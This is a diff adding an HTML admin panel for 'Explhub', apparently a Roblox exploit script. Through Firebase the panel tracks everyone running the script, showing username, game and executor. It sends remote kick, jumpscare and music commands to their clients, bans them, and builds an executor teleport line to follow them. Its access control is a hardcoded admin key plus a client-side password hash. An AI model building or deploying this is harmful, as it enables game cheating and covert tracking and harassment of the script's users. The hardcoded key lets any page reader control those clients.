@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Explhub · Usuarios en tiempo real</title>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: #0d1117; color: #e6edf3; font-family: 'Segoe UI', Arial, sans-serif; padding: 24px; }
+  h1 { font-size: 22px; margin-bottom: 4px; }
+  h1 span { color: #58a6ff; }
+  .sub { color: #8b949e; font-size: 13px; margin-bottom: 18px; }
+  .count { display: inline-block; background: #238636; border-radius: 20px; padding: 4px 14px; font-weight: bold; font-size: 14px; margin-bottom: 18px; }
+  .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 12px; }
+  .card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 14px; }
+  .top { display: flex; gap: 12px; align-items: center; margin-bottom: 10px; }
+  .top img { width: 64px; height: 64px; border-radius: 50%; background: #21262d; flex-shrink: 0; }
+  .info { min-width: 0; }
+  .name { font-weight: bold; font-size: 15px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .detail { font-size: 12px; color: #8b949e; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .online { font-size: 11px; color: #3fb950; font-weight: bold; }
+  .banned { font-size: 11px; color: #f85149; font-weight: bold; }
+  .btns { display: flex; flex-wrap: wrap; gap: 6px; }
+  .btns button { border: none; border-radius: 8px; padding: 7px 10px; font-size: 12px; font-weight: bold; cursor: pointer; color: #fff; }
+  .btns button:hover { filter: brightness(1.2); }
+  .b-join { background: #1f6feb; }
+  .b-kick { background: #da3633; }
+  .b-ban { background: #6e40c9; }
+  .b-unban { background: #238636; }
+  .b-scare { background: #9e6a03; }
+  .b-music { background: #8957e5; }
+  .empty { color: #8b949e; font-size: 14px; padding: 30px 0; text-align: center; }
+  .dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; background: #3fb950; margin-right: 5px; animation: pulse 1.5s infinite; }
+  @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
+  #lock { position: fixed; inset: 0; background: #0d1117; display: flex; align-items: center; justify-content: center; z-index: 9999; }
+  .lock-box { background: #161b22; border: 1px solid #30363d; border-radius: 14px; padding: 28px; width: 320px; text-align: center; }
+  .lock-title { font-size: 20px; font-weight: bold; margin-bottom: 6px; }
+  .lock-sub { font-size: 12px; color: #8b949e; margin-bottom: 16px; }
+  #lockPass { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #30363d; background: #0d1117; color: #fff; font-size: 14px; margin-bottom: 10px; outline: none; }
+  #lockBtn { width: 100%; padding: 10px; border: none; border-radius: 8px; background: #238636; color: #fff; font-weight: bold; font-size: 14px; cursor: pointer; }
+  #lockBtn:hover { filter: brightness(1.15); }
+  #lockMsg { margin-top: 10px; font-size: 12px; color: #f85149; min-height: 16px; }
+</style>
+</head>
+<body>
+  <div id="lock">
+    <div class="lock-box">
+      <div class="lock-title">🔒 Panel privado</div>
+      <div class="lock-sub">Solo el dueño puede ver y controlar usuarios.</div>
+      <input type="password" id="lockPass" placeholder="Contraseña" autocomplete="off">
+      <button id="lockBtn">Entrar</button>
+      <div id="lockMsg"></div>
+    </div>
+  </div>
+  <h1>Explhub <span>· Usuarios en tiempo real</span></h1>
+  <div class="sub">Creado por Xplort ✓ · Se actualiza solo · Panel de admin</div>
+  <div class="count"><span class="dot"></span><span id="onlineCount">0</span> en línea</div>
+  <div class="grid" id="grid"></div>
+  <div class="empty" id="empty" style="display:none">Nadie usando el script ahora mismo.</div>
+
+<script>
+  var ADMIN_KEY = "EXPLHUB_XPLORT_2026";
+
+  firebase.initializeApp({
+    databaseURL: "https://explhub-default-rtdb.firebaseio.com"
+  });
+  var db = firebase.database();
+  var cache = {};
+  var bans = {};
+
+  function timeAgo(ts) {
+    var s = Math.max(0, Math.floor((Date.now() - ts) / 1000));
+    if (s < 5) return "ahora mismo";
+    if (s < 60) return "hace " + s + "s";
+    return "hace " + Math.floor(s / 60) + "m";
+  }
+
+  function esc(s) {
+    return String(s == null ? "" : s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
+  }
+
+  function pushCmd(uid, action, args) {
+    db.ref("commands/" + uid).push({
+      action: action,
+      args: args || {},
+      key: ADMIN_KEY,
+      at: firebase.database.ServerValue.TIMESTAMP
+    });
+  }
+
+  function doJoin(uid) {
+    var u = (cache[uid] || {});
+    var code = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' + u.placeId + ', "' + (u.jobId || "") + '")';
+    try {
+      if (navigator.clipboard) navigator.clipboard.writeText(code);
+    } catch (e) {}
+    prompt("Pégalo en tu executor para unirte a " + (u.username || uid) + ":", code);
+  }
+
+  function doKick(uid) {
+    var r = prompt("Motivo del kick (vacío = mensaje por defecto):", "") || "";
+    pushCmd(uid, "kick", { reason: r });
+    alert("Kick enviado a " + ((cache[uid] || {}).username || uid));
+  }
+
+  function doBan(uid) {
+    var r = prompt("Motivo del baneo:", "Fuiste baneado de Explhub.") || "Fuiste baneado de Explhub.";
+    db.ref("bans/" + uid).set({
+      reason: r,
+      at: firebase.database.ServerValue.TIMESTAMP
+    });
+  }
+
+  function doUnban(uid) {
+    db.ref("bans/" + uid).remove();
+  }
+
+  function doScare(uid) {
+    var s = prompt("Sound ID del susto (opcional, vacío = solo visual):", "") || "";
+    pushCmd(uid, "jumpscare", { soundId: s });
+    alert("Jumpscare enviado a " + ((cache[uid] || {}).username || uid));
+  }
+
+  function doMusic(uid) {
+    var id = prompt("Sound ID de la música (vacío = detener la actual):", "") || "";
+    var vol = "3";
+    if (id !== "") vol = prompt("Volumen (1-10):", "3") || "3";
+    pushCmd(uid, "music", { assetId: id, volume: vol });
+    alert(id === "" ? "Música detenida." : "Música enviada a " + ((cache[uid] || {}).username || uid));
+  }
+
+  function render() {
+    var grid = document.getElementById("grid");
+    var now = Date.now();
+    var users = [];
+    Object.keys(cache).forEach(function(uid) {
+      var u = cache[uid];
+      if (u && u.lastSeen && (now - u.lastSeen) < 45000) users.push({ uid: uid, d: u });
+    });
+    users.sort(function(a, b) { return b.d.lastSeen - a.d.lastSeen; });
+    document.getElementById("onlineCount").textContent = users.length;
+    document.getElementById("empty").style.display = users.length ? "none" : "block";
+    grid.innerHTML = users.map(function(u) {
+      var d = u.d, uid = u.uid;
+      var isBanned = !!bans[uid];
+      var av = "https://www.roblox.com/headshot-thumbnail/image?userId=" + encodeURIComponent(uid) + "&width=150&height=150&format=png";
+      var status = isBanned
+        ? '<div class="banned">⛔ BANEADO</div>'
+        : '<div class="online"><span class="dot"></span>en línea · ' + timeAgo(d.lastSeen) + '</div>';
+      var banBtn = isBanned
+        ? '<button class="b-unban" data-act="unban" data-uid="' + esc(uid) + '">Desbanear</button>'
+        : '<button class="b-ban" data-act="ban" data-uid="' + esc(uid) + '">Banear</button>';
+      return '<div class="card">' +
+        '<div class="top">' +
+          '<img src="' + av + '" loading="lazy" onerror="this.style.visibility=\'hidden\'">' +
+          '<div class="info">' +
+            '<div class="name">' + esc(d.displayName || d.username) + '</div>' +
+            '<div class="detail">@' + esc(d.username) + ' · ID ' + esc(uid) + '</div>' +
+            '<div class="detail">🎮 ' + esc(d.game || ("Place " + d.placeId)) + '</div>' +
+            '<div class="detail">⚙️ ' + esc(d.executor || "?") + '</div>' +
+            status +
+          '</div>' +
+        '</div>' +
+        '<div class="btns">' +
+          '<button class="b-join" data-act="join" data-uid="' + esc(uid) + '">Unirse</button>' +
+          '<button class="b-kick" data-act="kick" data-uid="' + esc(uid) + '">Kick</button>' +
+          banBtn +
+          '<button class="b-scare" data-act="scare" data-uid="' + esc(uid) + '">Jumpscare</button>' +
+          '<button class="b-music" data-act="music" data-uid="' + esc(uid) + '">Música</button>' +
+        '</div></div>';
+    }).join("");
+  }
+
+  document.getElementById("grid").addEventListener("click", function(e) {
+    var b = e.target.closest("button[data-act]");
+    if (!b) return;
+    var act = b.getAttribute("data-act"), uid = b.getAttribute("data-uid");
+    if (act === "join") doJoin(uid);
+    else if (act === "kick") doKick(uid);
+    else if (act === "ban") { if (confirm("¿Banear a " + ((cache[uid] || {}).username || uid) + "?")) doBan(uid); }
+    else if (act === "unban") doUnban(uid);
+    else if (act === "scare") doScare(uid);
+    else if (act === "music") doMusic(uid);
+  });
+
+  var EXPECTED_HASH = "8a504d6625ad4323decbec43f1415168a98897c3199e8265cf949a5004a84025";
+
+  function sha256hex(str) {
+    var enc = new TextEncoder().encode(str);
+    return crypto.subtle.digest("SHA-256", enc).then(function(buf) {
+      return Array.prototype.map.call(new Uint8Array(buf), function(b) {
+        return ("0" + b.toString(16)).slice(-2);
+      }).join("");
+    });
+  }
+
+  var fails = 0, lockedUntil = 0;
+
+  function startApp() {
+    document.getElementById("lock").style.display = "none";
+    db.ref("presence").on("value", function(snap) {
+      cache = snap.val() || {};
+      render();
+    });
+    db.ref("bans").on("value", function(snap) {
+      bans = snap.val() || {};
+      render();
+    });
+    setInterval(render, 5000);
+  }
+
+  function tryLogin() {
+    var msg = document.getElementById("lockMsg");
+    if (Date.now() < lockedUntil) {
+      msg.textContent = "Bloqueado, espera unos segundos...";
+      return;
+    }
+    if (!window.crypto || !crypto.subtle) {
+      msg.textContent = "Tu navegador no soporta WebCrypto, usa Chrome/Edge actualizado.";
+      return;
+    }
+    var v = document.getElementById("lockPass").value || "";
+    sha256hex(v).then(function(h) {
+      if (h === EXPECTED_HASH) {
+        try { sessionStorage.setItem("explhub_unlocked", "1"); } catch (e) {}
+        startApp();
+      } else {
+        fails++;
+        if (fails >= 5) {
+          lockedUntil = Date.now() + 30000;
+          fails = 0;
+          msg.textContent = "Demasiados intentos. Bloqueado 30s.";
+        } else {
+          msg.textContent = "Contraseña incorrecta (" + fails + "/5).";
+        }
+        document.getElementById("lockPass").value = "";
+      }
+    });
+  }
+  document.getElementById("lockBtn").addEventListener("click", tryLogin);
+  document.getElementById("lockPass").addEventListener("keydown", function(e) {
+    if (e.key === "Enter") tryLogin();
+  });
+
+  try {
+    if (sessionStorage.getItem("explhub_unlocked") === "1" && EXPECTED_HASH !== "PEGA_AQUI_EL_HASH_SHA256_DE_TU_CONTRASENA") {
+      startApp();
+    }
+  } catch (e) {}
+</script>
+</body>
+</html>
